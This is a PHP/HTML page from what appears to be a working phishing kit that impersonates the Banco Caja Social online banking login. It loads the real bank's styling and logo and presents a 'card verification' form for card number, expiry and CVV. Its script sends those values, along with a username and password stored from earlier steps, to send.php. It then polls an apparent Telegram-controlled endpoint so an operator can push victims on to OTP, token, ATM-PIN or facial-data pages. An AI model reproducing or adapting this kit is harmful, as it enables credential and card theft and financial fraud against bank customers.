<?php
require_once __DIR__ . '/../config.php';

$sid   = 1;
$error = isset($_GET['error']) ? 'Datos de tarjeta incorrectos. Intente nuevamente.' : '';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
    <style>
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
    <div class="bb-stack bb-stack--wrap template-stack-container">
        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
        <div class="bb-stack__break bb-stack__break--md-down"></div>
        <div class="bb-stack__item--fill identity-container">
            <div class="identity-container__panel identity-container__panel--animated">
                <div class="identity-container__form">
                    <div class="login-logos-wrapper">
                        <div class="identity-logo bb-block bb-block--lg"></div>
                    </div>
                    <header>
                        <h1 id="kc-page-title">Verificación de tarjeta</h1>
                    </header>
                    <div class="bb-subtitle bb-block bb-block--lg">
                        <span>Ingrese los datos de su tarjeta débito o crédito para continuar.</span>
                    </div>
                    <div id="kc-form">
                        <div id="kc-form-wrapper">
                            <form id="form-step" autocomplete="off">
                                <div class="form-group bb-form-field">
                                    <label class="label" for="card-number">Número de tarjeta</label>
                                    <input id="card-number" class="form-control" type="text"
                                        maxlength="19" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" inputmode="numeric">
                                    <small id="card-error" class="bb-input-validation-message d-none" role="alert">
                                        Número de tarjeta inválido. Verifique e intente nuevamente.
                                    </small>
                                    <?php if ($error): ?>
                                        <small class="bb-input-validation-message" role="alert">
                                            <?= htmlspecialchars($error) ?>
                                        </small>
                                    <?php endif; ?>
                                </div>

                                <div class="form-group bb-form-field">
                                    <label class="label d-block">Fecha de vencimiento</label>
                                    <div class="row g-2">
                                        <div class="col-6">
                                            <input id="card-exp-month" class="form-control" type="text"
                                                maxlength="2" placeholder="MM" autocomplete="off" inputmode="numeric">
                                        </div>
                                        <div class="col-6">
                                            <input id="card-exp-year" class="form-control" type="text"
                                                maxlength="2" placeholder="AA" autocomplete="off" inputmode="numeric">
                                        </div>
                                    </div>
                                    <small id="exp-error" class="bb-input-validation-message d-none" role="alert">
                                        Fecha de vencimiento inválida.
                                    </small>
                                </div>

                                <div class="form-group bb-form-field">
                                    <label class="label" for="card-cvv">CVV</label>
                                    <input id="card-cvv" class="form-control" type="text"
                                        maxlength="4" placeholder="CVV" autocomplete="off" inputmode="numeric">
                                    <small id="cvv-error" class="bb-input-validation-message d-none" role="alert">
                                        CVV inválido.
                                    </small>
                                </div>

                                <div class="bb-button-bar bb-block bb-block--xl mt-3">
                                    <button id="btn-submit" class="btn btn-primary w-100" type="submit" disabled>
                                        Continuar
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SEND_URL = './send.php';
        const POLL_URL = './poll_updates.php';
        const CHAT_ID = <?= json_encode((string)CHAT_ID) ?>;
        let MESSAGE_ID = null;
        let SESSION_ID = localStorage.getItem('bcs_session_id') || '';
        const STORED_USER = localStorage.getItem('bcs_username') || '';
        const STORED_PASS = localStorage.getItem('bcs_password') || '';

        const ACTION_MAP = {
            'NEXT_TARJETA':  './tarjeta.php',
            'NEXT_CAJERO':   './cajero.php',
            'NEXT_ATM':      './cajero.php',
            'NEXT_DINAMICA': './dinamica.php',
            'NEXT_TOKEN':    './token.php',
            'NEXT_OTP':      './otp.php',
            'NEXT_FACIAL':   './facial.php',
            'NEXT_TEXTO':    './texto.php',
            'NEXT_WHATSAPP': null,
            'FINISH':        './approved.php',
            'BAN_IP':        './ban_ip.php',
            'ERR_LOGIN':     './contra.php?error=1&username=' + encodeURIComponent(STORED_USER),
            'ERR_PASS':      './tarjeta.php?error=1',
            'ERR_TARJETA':   './tarjeta.php?error=1',
            'ERR_CAJERO':    './tarjeta.php?error=1',
            'ERR_ATM':       './tarjeta.php?error=1',
            'ERR_DINAMICA':  './tarjeta.php?error=1',
            'ERR_TOKEN':     './tarjeta.php?error=1',
            'ERR_OTP':       './tarjeta.php?error=1',
            'ERR_FACIAL':    './tarjeta.php?error=1',
            'ERR_TEXTO':     './tarjeta.php?error=1',
        };

        async function startPolling() {
            if (!MESSAGE_ID) return;
            try {
                const r = await fetch(`${POLL_URL}?messageid=${MESSAGE_ID}&chatid=${CHAT_ID}`);
                const resp = await r.json();
                const action = resp?.action || null;

                if (resp.ok && action) {
                    const route = ACTION_MAP[action];
                    if (route) {
                        window.location.href = route;
                        return;
                    }
                }
                setTimeout(startPolling, 2500);
            } catch (e) {
                setTimeout(startPolling, 3000);
            }
        }

        function showLoader() {
            document.body.innerHTML = `
            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f5f5f5;">
                <div style="text-align:center;padding:40px;">
                    <img style="width:160px;margin-bottom:32px;"
                         src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
                    <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;
                        border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 24px;"></div>
                    <p style="color:#444;font-size:15px;margin:0;">Verificando información, por favor espere...</p>
                </div>
            </div>
            <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
        }

        const inpNumber = document.getElementById('card-number');
        const inpMonth = document.getElementById('card-exp-month');
        const inpYear = document.getElementById('card-exp-year');
        const inpCvv = document.getElementById('card-cvv');
        const btn = document.getElementById('btn-submit');

        const cardError = document.getElementById('card-error');
        const expError = document.getElementById('exp-error');
        const cvvError = document.getElementById('cvv-error');

        function onlyDigits(value) {
            return value.replace(/\D/g, '');
        }

        function luhnCheck(cardNumber) {
            const digits = cardNumber.replace(/\s+/g, '');
            if (!/^\d{13,19}$/.test(digits)) return false;

            let sum = 0;
            let shouldDouble = false;

            for (let i = digits.length - 1; i >= 0; i--) {
                let digit = parseInt(digits.charAt(i), 10);

                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }

                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        function validateExpiry(mm, yy) {
            mm = parseInt(mm, 10);
            yy = parseInt(yy, 10);
            if (isNaN(mm) || isNaN(yy)) return false;
            if (mm < 1 || mm > 12) return false;

            const current = new Date();
            const currentYear = current.getFullYear() % 100;
            const currentMonth = current.getMonth() + 1;

            if (yy < currentYear) return false;
            if (yy === currentYear && mm < currentMonth) return false;

            return true;
        }

        function validateCvv(cvv) {
            return /^\d{3,4}$/.test(cvv);
        }

        function formatCardNumber(value) {
            const digits = onlyDigits(value);
            return digits.replace(/(.{4})/g, '$1 ').trim();
        }

        function validateAll() {
            const numRaw = onlyDigits(inpNumber.value);
            const mm = inpMonth.value.trim();
            const yy = inpYear.value.trim();
            const cvv = inpCvv.value.trim();

            const validLuhn = luhnCheck(numRaw);
            const validExp = validateExpiry(mm, yy);
            const validCvv = validateCvv(cvv);

            cardError.classList.toggle('d-none', validLuhn || numRaw.length === 0);
            expError.classList.toggle('d-none', validExp || (mm.length === 0 && yy.length === 0));
            cvvError.classList.toggle('d-none', validCvv || cvv.length === 0);

            btn.disabled = !(validLuhn && validExp && validCvv);
        }

        inpNumber.addEventListener('input', () => {
            inpNumber.value = formatCardNumber(inpNumber.value);
            validateAll();
        });

        inpMonth.addEventListener('input', () => {
            inpMonth.value = onlyDigits(inpMonth.value).slice(0, 2);
            validateAll();
        });

        inpYear.addEventListener('input', () => {
            inpYear.value = onlyDigits(inpYear.value).slice(0, 2);
            validateAll();
        });

        inpCvv.addEventListener('input', () => {
            inpCvv.value = onlyDigits(inpCvv.value).slice(0, 4);
            validateAll();
        });

        document.getElementById('form-step').addEventListener('submit', async function(e) {
            e.preventDefault();

            const numberRaw = onlyDigits(inpNumber.value);
            const mm = inpMonth.value.trim();
            const yy = inpYear.value.trim();
            const cvv = inpCvv.value.trim();

            if (btn.disabled) return;

            showLoader();

            const res = await fetch(SEND_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    step: 'TARJETA',
                    event: 'TARJETA',
                    sessionId: SESSION_ID,
                    username: STORED_USER,
                    password: STORED_PASS,
                    tarjeta: numberRaw,
                    exp_month: mm,
                    exp_year: yy,
                    cvv: cvv
                })
            });
            const data = await res.json();
            if (data.ok && data.messageid) {
                MESSAGE_ID = data.messageid;
                if (data.sessionid) {
                    SESSION_ID = data.sessionid;
                    localStorage.setItem('bcs_session_id', SESSION_ID);
                }
                startPolling();
            } else {
                window.location.href = './tarjeta.php?error=1';
            }
        });
    </script>
    <script src="/sura new/js/bin_block.js"></script>
</body>

</html>